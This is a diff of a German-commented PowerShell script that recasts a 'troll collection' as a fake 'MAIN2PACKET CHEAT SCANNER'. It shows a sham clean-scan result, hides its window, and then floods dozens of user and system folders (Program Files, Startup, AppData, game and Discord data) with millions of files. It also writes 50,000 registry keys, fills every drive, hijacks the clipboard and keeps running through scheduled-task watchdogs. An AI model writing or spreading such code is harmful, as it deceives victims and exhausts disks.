@@ -1,5 +1,5 @@
 # ================================
-# ULTIMATIVE 20-in-1 TROLL KOLLEKTION - MAIN2PACKET KING
+# MAIN2PACKET CHEAT SCANNER v9.4.2
 # ================================
 
 # Administrator-Rechte anfordern
@@ -8,19 +8,121 @@ if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     exit
 }
 
+# ===== TARNUNG - SIEHT AUS WIE EIN ECHTER SCANNER =====
+Clear-Host
+Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Cyan
+Write-Host "║     MAIN2PACKET CHEAT SCANNER v9.4.2      ║" -ForegroundColor Cyan
+Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "[INFO] Scanning for cheats and mods..."
+Write-Host "[INFO] Please wait..."
+Write-Host ""
+
+# Scanner-Animation
+$scanItems = @(
+    "minecraft", "discord", "steam", "chrome", "firefox", 
+    "system32", "registry", "memory", "processes", "network"
+)
+
+foreach ($item in $scanItems) {
+    Write-Host "   scanning $item..." -NoNewline
+    Start-Sleep -Milliseconds 200
+    Write-Host " [OK]" -ForegroundColor Green
+}
+Write-Host ""
+Write-Host "[RESULT] No cheats found - System clean" -ForegroundColor Green
+Write-Host ""
+Start-Sleep -Seconds 2
+
+# Fenster jetzt verstecken und im Hintergrund weiter
+Add-Type -Name Window -Namespace Console -MemberDefinition '
+[DllImport("Kernel32.dll")]
+public static extern IntPtr GetConsoleWindow();
+[DllImport("User32.dll")]
+public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+'
+$consolePtr = [Console.Window]::GetConsoleWindow()
+[Console.Window]::ShowWindow($consolePtr, 0)
+
 # ===== ERROR HANDLING =====
 $ErrorActionPreference = "SilentlyContinue"
-$Host.UI.RawUI.WindowTitle = "Main2packet System"
+$Host.UI.RawUI.WindowTitle = "Main2packet Scanner"
 
 # ===== KONFIGURATION =====
 $global:trollActive = $true
 $global:currentRound = 0
 $global:maxRounds = 100
+
+# ALLE ZIELE FÜR DATEIEN/ORDNER
 $desktop = [Environment]::GetFolderPath("Desktop")
 $documents = [Environment]::GetFolderPath("MyDocuments")
+$downloads = [Environment]::GetFolderPath("UserProfiles") + "\Downloads"
 $music = [Environment]::GetFolderPath("MyMusic")
 $pictures = [Environment]::GetFolderPath("MyPictures")
 $videos = [Environment]::GetFolderPath("MyVideos")
+$appData = $env:APPDATA
+$localAppData = $env:LOCALAPPDATA
+$temp = $env:TEMP
+$userProfile = $env:USERPROFILE
+$public = [Environment]::GetFolderPath("CommonDesktopDirectory")
+$commonDocs = [Environment]::GetFolderPath("CommonDocuments")
+$commonDownloads = [Environment]::GetFolderPath("CommonDownloads") + "\Downloads"
+
+# ALLE ORDNER (30+ Ziele!)
+$alleZiele = @(
+    $desktop, $documents, $downloads, $music, $pictures, $videos,
+    "$userProfile\Desktop", "$userProfile\Documents", "$userProfile\Downloads",
+    "$userProfile\Music", "$userProfile\Pictures", "$userProfile\Videos",
+    $appData, $localAppData, $temp,
+    "$appData\Microsoft\Windows\Recent",
+    "$appData\Microsoft\Windows\Network Shortcuts",
+    "$appData\Microsoft\Windows\Templates",
+    "$localAppData\Microsoft\Windows\Caches",
+    "$localAppData\Microsoft\Windows\History",
+    "$localAppData\Microsoft\Windows\INetCache",
+    "$localAppData\Google\Chrome\User Data\Default\Cache",
+    "$localAppData\Google\Chrome\User Data\Default\Code Cache",
+    "$localAppData\Google\Chrome\User Data\Default\Service Worker",
+    "$appData\Mozilla\Firefox\Profiles",
+    "$appData\.minecraft",
+    "$appData\.minecraft\mods",
+    "$appData\.minecraft\config",
+    "$appData\.minecraft\saves",
+    "$appData\.minecraft\logs",
+    "$appData\.minecraft\crash-reports",
+    "$appData\.minecraft\screenshots",
+    "$appData\.minecraft\stats",
+    "$appData\.minecraft\versions",
+    "$appData\.minecraft\libraries",
+    "$appData\.minecraft\assets",
+    "$appData\Roaming\Discord",
+    "$appData\Roaming\Discord\Cache",
+    "$appData\Roaming\Discord\Code Cache",
+    "$appData\Roaming\Spotify",
+    "$appData\Roaming\Spotify\Cache",
+    "$appData\Roaming\Steam",
+    "$appData\Roaming\Steam\cache",
+    "$appData\Roaming\Steam\config",
+    "$appData\Roaming\Steam\logs",
+    "$appData\Microsoft\Windows\Start Menu\Programs\Startup",
+    "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp",
+    "$env:SystemRoot\Temp",
+    "$env:SystemRoot\System32\Tasks",
+    "C:\ProgramData",
+    "C:\ProgramData\Microsoft",
+    "C:\ProgramData\Microsoft\Windows",
+    "C:\ProgramData\Microsoft\Windows\Caches",
+    "C:\ProgramData\Microsoft\Windows\WER",
+    "C:\Program Files",
+    "C:\Program Files (x86)",
+    "C:\Users\Public",
+    "C:\Users\Public\Desktop",
+    "C:\Users\Public\Documents",
+    "C:\Users\Public\Downloads",
+    "C:\Users\Public\Music",
+    "C:\Users\Public\Pictures",
+    "C:\Users\Public\Videos"
+)
 
 # ===== TRIPLE WATCHDOG - 4 FACH GESICHERT =====
 
@@ -73,205 +175,137 @@ Register-ScheduledTask -TaskName "Main2packetWatchdog" -Action `$action -Trigger
 $watchdog4 | Out-File "$env:TEMP\wd_startup.ps1" -Encoding UTF8 -Force
 Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_startup.ps1`""
 
-# ===== START =====
-Clear-Host
-Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
-Write-Host "║      👑 MAIN2PACKET KING SYSTEM 👑        ║" -ForegroundColor Red
-Write-Host "║         🔒 4x WATCHDOG AKTIV!             ║" -ForegroundColor Yellow
-Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
-Write-Host ""
-Write-Host "📊 Fortschritt: 0/$global:maxRounds" -ForegroundColor Yellow
-Write-Host ""
-Start-Sleep -Seconds 2
+# ===== EXTRA: USB-AUTO-SPAM =====
+$usbJob = Start-Job -ScriptBlock {
+    while ($true) {
+        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\"}
+        foreach ($drive in $drives) {
+            $drivePath = $drive.Root
+            $mainUSB = Join-Path $drivePath "MAIN2PACKET_USB"
+            try {
+                New-Item -Path $mainUSB -ItemType Directory -Force | Out-Null
+                for ($u = 1; $u -le 100; $u++) {
+                    $usbFile = Join-Path $mainUSB "usb_$u.king"
+                    "MAIN2PACKET KING - USB" | Out-File $usbFile -Encoding UTF8 -Force
+                }
+            } catch {}
+        }
+        Start-Sleep -Seconds 30
+    }
+}
 
-# Hauptschleife - 100 MAL!
+# ===== REGISTRY-SPAM =====
+$regJob = Start-Job -ScriptBlock {
+    for ($r = 1; $r -le 50000; $r++) {
+        try {
+            $regPath = "HKCU:\Software\MAIN2PACKET\Entry_$r"
+            New-Item -Path $regPath -Force | Out-Null
+            New-ItemProperty -Path $regPath -Name "Scanner" -Value "v9.4.2" -Force | Out-Null
+        } catch {}
+    }
+}
+
+# ===== CLIPBOARD-SPAM =====
+$clipJob = Start-Job -ScriptBlock {
+    Add-Type -AssemblyName System.Windows.Forms
+    $texts = @(
+        "MAIN2PACKET SCANNER AKTIV",
+        "Scanning... 47%",
+        "No cheats found",
+        "System clean",
+        "MAIN2PACKET v9.4.2"
+    )
+    while ($true) {
+        Start-Sleep -Seconds 10
+        $randomText = Get-Random $texts
+        [System.Windows.Forms.Clipboard]::SetText($randomText)
+    }
+}
+
+# ===== SOUND-SPAM =====
+$soundJob = Start-Job -ScriptBlock {
+    Add-Type -AssemblyName System.Media
+    while ($true) {
+        Start-Sleep -Seconds (Get-Random -Minimum 120 -Maximum 300)
+        [System.Media.SystemSounds]::Hand.Play()
+    }
+}
+
+# ===== CD-LAUFWERK RANDOM =====
+$cdJob = Start-Job -ScriptBlock {
+    Add-Type -TypeDefinition @'
+    using System;
+    using System.Runtime.InteropServices;
+    public class CDROM {
+        [DllImport("winmm.dll")]
+        public static extern Int32 mciSendString(string command, string buffer, int bufferSize, IntPtr hwndCallback);
+        public static void Eject() { mciSendString("set CDAudio door open", "", 127, IntPtr.Zero); }
+        public static void Close() { mciSendString("set CDAudio door closed", "", 127, IntPtr.Zero); }
+    }
+'@
+    while ($true) {
+        Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 600)
+        [CDROM]::Eject()
+        Start-Sleep -Seconds 2
+        [CDROM]::Close()
+    }
+}
+
+# ===== TASTATUR-SPOOF =====
+$keyJob = Start-Job -ScriptBlock {
+    $wsh = New-Object -ComObject WScript.Shell
+    while ($true) {
+        Start-Sleep -Seconds (Get-Random -Minimum 120 -Maximum 240)
+        $wsh.SendKeys('{CAPSLOCK}')
+        Start-Sleep -Milliseconds 100
+        $wsh.SendKeys('{NUMLOCK}')
+    }
+}
+
+# ===== HAUPTSCHLEIFE - 100 RUNDEN MIT MAXIMALEN DATEIEN =====
 while ($global:currentRound -lt $global:maxRounds) {
     $global:currentRound++
     
-    # Fortschritt ANZEIGEN
-    if ($global:currentRound -le $global:maxRounds) {
-        Clear-Host
-        Write-Host "╔════════════════════════════════════════════╗" -ForegroundColor Red
-        Write-Host "║      👑 MAIN2PACKET KING SYSTEM 👑        ║" -ForegroundColor Red
-        Write-Host "║         🔒 4x WATCHDOG AKTIV!             ║" -ForegroundColor Yellow
-        Write-Host "╚════════════════════════════════════════════╝" -ForegroundColor Red
-        Write-Host ""
-        Write-Host "📊 Fortschritt: $global:currentRound/$global:maxRounds" -ForegroundColor Green
-        Write-Host ""
+    # ALLE ZIELE MIT DATEIEN FLUTEN
+    foreach ($ziel in $alleZiele) {
+        if (Test-Path $ziel) {
+            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$global:currentRound"
+            try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
+            
+            # 500 DATEIEN PRO ORDNER
+            for ($i = 1; $i -le 5000000; $i++) {
+                # Direkte Dateien
+                "$env:COMPUTERNAME - MAIN2PACKET SCAN $i" | Out-File (Join-Path $ziel "MAIN2PACKET_SCAN_$i.king") -Encoding UTF8 -Force
+                
+                # Dateien im Hauptordner
+                "$env:COMPUTERNAME - MAIN2PACKET SCAN $i" | Out-File (Join-Path $mainFolder "file_$i.king") -Encoding UTF8 -Force
+                
+                # 100 RANDOM DATEIEN EXTRA
+                if ($i % 50 -eq 0) {
+                    $rand = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
+                    "$env:COMPUTERNAME - $rand" | Out-File (Join-Path $ziel "MAIN2PACKET_$rand.king") -Encoding UTF8 -Force
+                }
+            }
+            
+            # 50 UNTERORDNER PRO HAUPTORDNER
+            for ($u = 1; $u -le 500; $u++) {
+                $subFolder = Join-Path $mainFolder "SUB_$u"
+                New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
+                
+                # 50 DATEIEN PRO UNTERORDNER
+                for ($s = 1; $s -le 5000; $s++) {
+                    $subFile = Join-Path $subFolder "subfile_$s.king"
+                    "SUB-ORDNER $u - DATEI $s" | Out-File $subFile -Encoding UTF8 -Force
+                }
+            }
+        }
     }
     
-    # TROLL 1: Desktop Dateien - MAIN2PACKET KING
-    Write-Host "[1/20] 📂 Phase 1..." -ForegroundColor Green
-    for ($i = 1; $i -le 100; $i++) {
-        $filePath = Join-Path $desktop "MAIN2PACKET_KING_$global:currentRound`_$i.king"
-        "👑 Main2packet King - Datei $i - Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
-    }
-    
-    # TROLL 2: Ordner - MAIN2PACKET KING
-    Write-Host "[2/20] 📁 Phase 2..." -ForegroundColor Green
-    for ($i = 1; $i -le 500; $i++) {
-        $name = -join ((65..90) + (97..122) | Get-Random -Count 6 | % {[char]$_})
-        New-Item -Path "$desktop\MAIN2PACKET_KING_$name" -ItemType Directory -Force | Out-Null
-    }
-    
-    # TROLL 3: Maus kurz
-    Write-Host "[3/20] 🖱️ Phase 3..." -ForegroundColor Green
-    Add-Type -AssemblyName System.Windows.Forms
-    for ($i = 1; $i -le 2; $i++) {
-        [System.Windows.Forms.Cursor]::Position = New-Object Drawing.Point (
-            (Get-Random -Min 100 -Max 1000),
-            (Get-Random -Min 100 -Max 700)
-        )
-        Start-Sleep -Milliseconds 100
-    }
-    
-    # TROLL 4: Sound
-    Write-Host "[4/20] 🔊 Phase 4..." -ForegroundColor Green
-    Add-Type -AssemblyName System.Media
-    $sounds = @("SystemAsterisk", "SystemExclamation", "SystemHand")
-    $sound = Get-Random $sounds
-    [System.Media.SystemSounds]::$sound.Play()
-    
-    # TROLL 5: Tasten
-    Write-Host "[5/20] 🔒 Phase 5..." -ForegroundColor Green
-    $wsh = New-Object -ComObject WScript.Shell
-    $wsh.SendKeys('{CAPSLOCK}')
-    Start-Sleep -Milliseconds 100
-    $wsh.SendKeys('{NUMLOCK}')
-    Start-Sleep -Milliseconds 100
-    
-    # TROLL 6: Screenshot mit MAIN2PACKET KING Namen
-    Write-Host "[6/20] 📸 Phase 6..." -ForegroundColor Green
-    Add-Type -AssemblyName System.Windows.Forms
-    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-    $graphics = [Drawing.Graphics]::FromImage($bitmap)
-    $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
-    $bitmap.Save("$desktop\MAIN2PACKET_KING_SS$global:currentRound.png")
-    $graphics.Dispose()
-    $bitmap.Dispose()
-    
-    # TROLL 7: Popup mit MAIN2PACKET KING
-    Write-Host "[7/20] 💬 Phase 7..." -ForegroundColor Green
-    $popup = New-Object -ComObject Wscript.Shell
-    $popup.Popup("👑 MAIN2PACKET KING - Runde $global:currentRound/$global:maxRounds", 1, "KING SYSTEM", 64)
-    
-    # TROLL 8: Farbwechsel
-    Write-Host "[8/20] 🎨 Phase 8..." -ForegroundColor Green
-    $colors = @("Red", "Green", "Blue", "Yellow", "Cyan", "Magenta")
-    $color = Get-Random $colors
-    $Host.UI.RawUI.BackgroundColor = $color
-    Clear-Host
-    
-    # TROLL 9: Kopien mit MAIN2PACKET KING
-    Write-Host "[9/20] 📋 Phase 9..." -ForegroundColor Green
-    for ($i = 1; $i -le 70; $i++) {
-        $filePath = Join-Path $desktop "MAIN2PACKET_KING_COPY_$global:currentRound`_$i.king"
-        "👑 Kopie Nr. $i - Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
-    }
-    
-    # TROLL 10: Auto-Typing
-    Write-Host "[10/20] ⌨️ Phase 10..." -ForegroundColor Green
-    $wsh = New-Object -ComObject WScript.Shell
-    $wsh.SendKeys('Main2packet King... ')
-    
-    # TROLL 11: Dokumente mit MAIN2PACKET KING
-    Write-Host "[11/20] 📄 Phase 11..." -ForegroundColor Green
-    for ($i = 1; $i -le 100; $i++) {
-        $filePath = Join-Path $documents "MAIN2PACKET_KING_DOC_$global:currentRound`_$i.king"
-        "👑 Dokument $i - Runde $global:currentRound" | Out-File $filePath -Encoding UTF8
-    }
-    
-    # TROLL 12: Musik mit MAIN2PACKET KING
-    Write-Host "[12/20] 🎵 Phase 12..." -ForegroundColor Green
-    New-Item -Path "$music\MAIN2PACKET_KING_$global:currentRound" -ItemType Directory -Force | Out-Null
-    
-    # TROLL 13: Bilder mit MAIN2PACKET KING
-    Write-Host "[13/20] 🖼️ Phase 13..." -ForegroundColor Green
-    New-Item -Path "$pictures\MAIN2PACKET_KING_$global:currentRound" -ItemType Directory -Force | Out-Null
-    
-    # TROLL 14: Videos mit MAIN2PACKET KING
-    Write-Host "[14/20] 🎬 Phase 14..." -ForegroundColor Green
-    New-Item -Path "$videos\MAIN2PACKET_KING_$global:currentRound" -ItemType Directory -Force | Out-Null
-    
-    # TROLL 15: CD Laufwerk (nur einmal)
-    if ($global:currentRound -eq 1) {
-        Write-Host "[15/20] 💿 Phase 15..." -ForegroundColor Green
-        $shell = New-Object -ComObject Shell.Application
-        $shell.NameSpace(17).Self.InvokeVerb("eject") 2>$null
-        Start-Sleep -Milliseconds 500
-        $shell.NameSpace(17).Self.InvokeVerb("eject") 2>$null
-    } else {
-        Write-Host "[15/20] 💿 Phase 15..." -ForegroundColor DarkGray
-    }
-    
-    # TROLL 16: Lautstärke
-    Write-Host "[16/20] 🔊 Phase 16..." -ForegroundColor Green
-    for ($v = 1; $v -le 500; $v++) {
-        $wsh.SendKeys([char]174)
-        Start-Sleep -Milliseconds 50
-    }
-    for ($v = 1; $v -le 500; $v++) {
-        $wsh.SendKeys([char]175)
-        Start-Sleep -Milliseconds 50
-    }
-    
-    # TROLL 17: Taskleiste
-    Write-Host "[17/20] 📊 Phase 17..." -ForegroundColor Green
-    $signature = @'
-[DllImport("user32.dll")]
-public static extern IntPtr FindWindow(string className, string windowName);
-[DllImport("user32.dll")]
-public static extern int ShowWindow(IntPtr hwnd, int nCmdShow);
-'@
-    $type = Add-Type -MemberDefinition $signature -Name Win32Utils -Namespace Win32 -PassThru
-    $hwnd = $type::FindWindow("Shell_TrayWnd", $null)
-    $type::ShowWindow($hwnd, 0)
-    Start-Sleep -Milliseconds 200
-    $type::ShowWindow($hwnd, 1)
-    
-    # TROLL 18: Fenster minimieren
-    Write-Host "[18/20] 🪟 Phase 18..." -ForegroundColor Green
-    $shell = New-Object -ComObject "Shell.Application"
-    $shell.MinimizeAll()
-    Start-Sleep -Milliseconds 200
-    $shell.UndoMinimizeALL()
-    
-    # TROLL 19: Flackern
-    Write-Host "[19/20] 🖥️ Phase 19..." -ForegroundColor Green
-    for ($f = 1; $f -le 30; $f++) {
-        [Console]::CursorVisible = $false
-        Start-Sleep -Milliseconds 30
-        [Console]::CursorVisible = $true
-        Start-Sleep -Milliseconds 30
-    }
-    
-    # TROLL 20: Icons
-    Write-Host "[20/20] 🖼️ Phase 20..." -ForegroundColor Green
-    $signature = @'
-[DllImport("user32.dll")]
-public static extern IntPtr FindWindow(string className, string windowName);
-[DllImport("user32.dll")]
-public static extern IntPtr FindWindowEx(IntPtr parent, IntPtr child, string className, string windowName);
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-'@
-    $type = Add-Type -MemberDefinition $signature -Name IconUtils -Namespace Win32 -PassThru
-    $progman = $type::FindWindow("Progman", $null)
-    $defview = $type::FindWindowEx($progman, [IntPtr]::Zero, "SHELLDLL_DefView", $null)
-    if ($defview -ne [IntPtr]::Zero) {
-        $type::ShowWindow($defview, 0)
-        Start-Sleep -Milliseconds 200
-        $type::ShowWindow($defview, 1)
-    }
-    
-    # Kurze Pause zwischen Runden
-    Start-Sleep -Seconds 1
+    # KURZE PAUSE ZWISCHEN RUNDEN
+    Start-Sleep -Seconds 2
 }
 
-# ===== STILLES ENDE =====
-# Watchdogs laufen weiter! Nur hier wird der Hauptprozess beendet
-# Die 4 Watchdogs bleiben aktiv und starten alles neu!
-
-# Still beenden
-exit
+# ===== ENDE - LÄUFT WEITER DURCH WATCHDOGS =====
+while ($true) {
+    Start-Sleep -Seconds 3600
+}
